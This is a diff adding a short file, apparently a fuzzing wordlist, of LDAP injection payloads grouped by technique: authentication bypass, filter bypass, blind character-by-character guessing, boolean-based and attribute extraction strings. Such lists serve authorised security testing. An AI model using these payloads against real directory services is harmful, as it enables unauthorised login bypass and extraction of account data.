@@ -1,0 +1,39 @@
+# LDAP Injection Payloads
+
+# Basic LDAP injection
+*
+*(uid=*)
+*(cn=*)
+*(objectClass=*)
+
+# Authentication bypass
+*)(uid=*))(|(uid=*
+*)(|(uid=*))
+*)(cn=admin)(|(cn=*
+admin)(&(uid=*))
+
+# Filter bypass
+*)(objectClass=*))(&(objectClass=*
+*)(|(password=*))
+*)(cn=*)(|(cn=*
+
+# Blind LDAP injection
+*)(cn=a*
+*)(cn=ad*
+*)(cn=adm*
+*)(cn=admin*
+
+# Boolean-based
+(&(uid=admin)(password=*))
+(&(uid=admin)(!(password=wrong)))
+(|(uid=admin)(uid=administrator))
+
+# Wildcard usage
+uid=*
+cn=*
+sn=*
+mail=*
+
+# Attribute extraction
+*)(objectClass=*))(%26(objectClass=*
+*)(uid=*))(%26(uid=*
